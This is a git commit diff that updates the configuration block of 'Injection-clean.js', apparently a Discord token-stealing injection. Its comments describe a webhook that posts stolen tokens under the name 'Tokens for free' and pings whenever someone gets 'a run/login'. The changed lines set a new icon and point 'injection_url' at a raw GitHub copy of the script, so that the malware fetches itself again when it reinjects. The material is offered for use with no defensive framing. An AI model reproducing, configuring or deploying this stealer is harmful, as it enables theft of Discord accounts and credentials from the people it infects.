8f3de528f52b26e1b6c421e98d04421d4e0e421d
Cryxyemi <113242324+Cryxyemi@users.noreply.github.com>
2022-10-01 12:55:34 +0200

    Update Injection-clean.js

--- Injection-clean.js
+++ Injection-clean.js
@@ -11,9 +11,9 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: "Tokens for free", //name of the webhook thats gonna send the info
-  embed_icon: "https://media.discordapp.net/attachments/970982305021706303/971383656453144627/OracleLogo.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: "https://cdn.discordapp.com/attachments/985849153089335366/1012407783141937242/Logo_2.png".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 3553599, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: "https://cdn.discordapp.com/attachments/985849153089335366/1012407783141937242/Logo_2.png", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/Cryxyemi/Discord-Injection/master/Injection-clean.js", //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
